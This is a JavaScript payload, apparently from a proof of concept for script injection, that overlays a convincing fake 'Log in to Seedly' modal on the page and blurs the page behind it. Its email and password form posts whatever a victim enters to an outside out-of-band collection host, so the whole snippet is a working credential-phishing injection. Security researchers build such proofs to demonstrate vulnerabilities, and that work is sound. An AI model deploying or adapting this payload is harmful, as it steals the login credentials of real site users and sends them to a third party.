(function() {
  // INSERT EXACT SEEDLY LOGIN MODAL
  document.body.insertAdjacentHTML('beforeend', `
    <div id="custom-login-modal" style="
      position:fixed;top:0;left:0;width:100%;height:100%;
      background:rgba(0,0,0,0.7);display:flex;
      justify-content:center;align-items:center;z-index:999999;
      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    ">
      <div style="
        background:#1a1a1a;border-radius:12px;padding:30px;
        max-width:380px;width:100%;color:#fff;
        box-shadow:0 10px 30px rgba(0,0,0,0.3);
      ">
        <h2 style="text-align:center;margin:0 0 20px;font-size:24px;font-weight:600;">
          Log in to Seedly
        </h2>

        <!-- SOCIAL BUTTONS -->
        <button style="
          width:100%;padding:12px;margin:8px 0;border-radius:8px;
          border:none;font-size:15px;cursor:pointer;display:flex;
          align-items:center;justify-content:center;gap:10px;
        " onclick="alert('Google login blocked in PoC')">
          <img src="https://seedly.sg/assets/google-icon.png" width="20"> 
          Continue with Google
        </button>

        <button style="
          width:100%;padding:12px;margin:8px 0;border-radius:8px;
          background:#1877f2;color:#fff;border:none;font-size:15px;
          cursor:pointer;display:flex;align-items:center;
          justify-content:center;gap:10px;
        ">
          <img src="https://seedly.sg/assets/fb-icon.png" width="20"> 
          Continue with Facebook
        </button>

        <button style="
          width:100%;padding:12px;margin:8px 0;border-radius:8px;
          background:#000;color:#fff;border:none;font-size:15px;
          cursor:pointer;display:flex;align-items:center;
          justify-content:center;gap:10px;
        ">
          <img src="https://seedly.sg/assets/apple-icon.png" width="20"> 
          Continue with Apple
        </button>

        <div style="text-align:center;margin:15px 0;color:#888;font-size:14px;">OR</div>

        <!-- EMAIL/PASS FORM -->
        <form action="https://abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun" method="POST">
          <input type="email" name="email" placeholder="Your email" required style="
            width:100%;padding:12px;margin:8px 0;border-radius:8px;
            border:1px solid #444;background:#2a2a2a;color:#fff;
            font-size:15px;outline:none;
          ">
          <input type="password" name="password" placeholder="Your password" required style="
            width:100%;padding:12px;margin:8px 0;border-radius:8px;
            border:1px solid #444;background:#2a2a2a;color:#fff;
            font-size:15px;outline:none;
          ">
          <a href="#" style="color:#4fd1c5;font-size:13px;display:block;margin:10px 0;text-align:right;">
            Forgot your password?
          </a>
          <button type="submit" style="
            width:100%;padding:14px;margin:10px 0;border-radius:8px;
            background:#4fd1c5;color:#000;font-weight:bold;
            font-size:16px;border:none;cursor:pointer;
          ">Login</button>
        </form>

        <p style="text-align:center;margin-top:20px;font-size:14px;color:#aaa;">
          New to Seedly? 
          <a href="#" style="color:#4fd1c5;text-decoration:none;">Create an account</a>
        </p>
      </div>
    </div>
  `);

  // BLUR BACKGROUND (FIXED!)
  const page = document.querySelector('body') || document.body;
  page.style.transition = 'filter 0.3s ease';
  page.style.filter = 'blur(6px)';

  // CLOSE ON CLICK OUTSIDE OR ESC
  const modal = document.getElementById('custom-login-modal');
  modal.addEventListener('click', e => {
    if (e.target === modal) {
      modal.remove();
      page.style.filter = 'none';
    }
  });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && modal) {
      modal.remove();
      page.style.filter = 'none';
    }
  });
})();
